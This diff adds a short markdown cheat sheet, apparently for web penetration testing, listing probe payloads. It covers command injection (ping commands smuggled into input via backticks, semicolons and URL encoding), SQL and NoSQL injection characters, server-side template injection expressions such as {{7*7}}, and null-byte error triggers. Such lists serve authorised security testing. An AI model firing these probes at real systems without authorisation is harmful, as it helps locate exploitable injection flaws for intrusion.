@@ -1,0 +1,43 @@
+## Command injection
+
+`ping -c 1 $IP -s 30`
+;ping -c 1 $IP -s 31
+%2520`ping -c 1 $IP -s 32`
+';ping -c 1 $IP -s 33
+
+## SQLi
+
+'
+"
+\
+#
+/*
+-- -
+--/**/-
+;%00
+`
+(
+)
+
+## NoSQLi
+
+'
+"
+;
+{
+}
+
+## SSTI -- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+${{<%[%'"}}%\.
+${7*7}
+{{7*7}}
+{{7*'7}}
+a{*comment*}b
+${"z".join("ab)}
+@(7*7)
+@{7*7}
+
+## Generate errors
+%00
+%0A
+%0D
